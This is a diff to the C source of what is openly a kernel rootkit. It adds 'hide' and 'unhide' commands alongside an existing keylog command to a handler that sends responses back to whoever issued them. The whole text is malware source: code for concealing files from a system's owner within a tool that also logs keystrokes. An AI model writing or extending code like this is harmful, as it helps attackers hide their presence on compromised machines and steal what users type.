@@ -20,6 +20,23 @@ void rootkit_handler(struct work_struct* work) {
             DEBUG_PRINTF("rootkit: keylog command: %s \n", args->string);
             keylog_command(args);
             break;
+        case HIDE:
+            DEBUG_PRINTF("rootkit: hide command: %s \n", args->string);
+            if (!add_hidden_file(args->string)) {
+                send_response("rootkit: can't hide the given file\n", args);
+            } else {
+                send_response("rootkit: successfully hid the given file\n", args);
+            }
+            break;
+        case UNHIDE:
+            DEBUG_PRINTF("rootkit: unhide command: %s \n", args->string);
+            if (!remove_hidden_file(args->string)) {
+                send_response("can't unhid the given file\n", args);
+            } else {
+                send_response("rootkit: successfully unhid the given file\n", args);
+            }
+            break;
+
         default:
             DEBUG_PUTS("rootkit: invalid command\n")
             send_response("rootkit: invalid command", args);
